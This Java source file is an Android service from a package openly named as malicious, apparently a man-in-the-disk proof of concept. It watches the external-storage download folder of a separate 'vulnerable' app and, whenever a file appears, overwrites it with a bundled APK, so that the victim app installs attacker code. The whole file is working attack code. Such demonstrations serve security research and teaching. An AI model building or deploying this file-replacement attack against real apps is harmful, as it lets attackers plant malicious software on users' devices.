package org.mmm.anothermaliciousapp;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.FileObserver;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class MitdService extends Service {

    private static final String TAG = "MALICIOUS_MitdService";

    private static FileObserver observer;


    public MitdService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            final String path = Environment.getExternalStorageDirectory().getCanonicalPath() + "/Android/data/org.mmm.anothervulnerableapp/files/";
            Log.i(TAG, "Start observer for " + path);
            observer = new FileObserver(path, FileObserver.CREATE) {
                @Override
                public void onEvent(int event, @Nullable String eventPath) {
                    if (eventPath != null) {
                        Log.i(TAG, "Event " + event + " for " + eventPath);
                        try {
                            Thread.sleep(1000);
                            InputStream is = getAssets().open("app-release.apk");
                            FileOutputStream os = new FileOutputStream(new File(path, eventPath), false);
                            byte[] data = new byte[is.available()];
                            is.read(data);
                            os.write(data);
                            is.close();
                            os.close();
                            Log.i(TAG, "APK has been overwritten");
                        } catch (IOException e) {
                            e.printStackTrace();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            };
            observer.startWatching();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "Destroy observer " + observer);
        if (observer != null)
            observer.stopWatching();
        observer = null;
    }
}
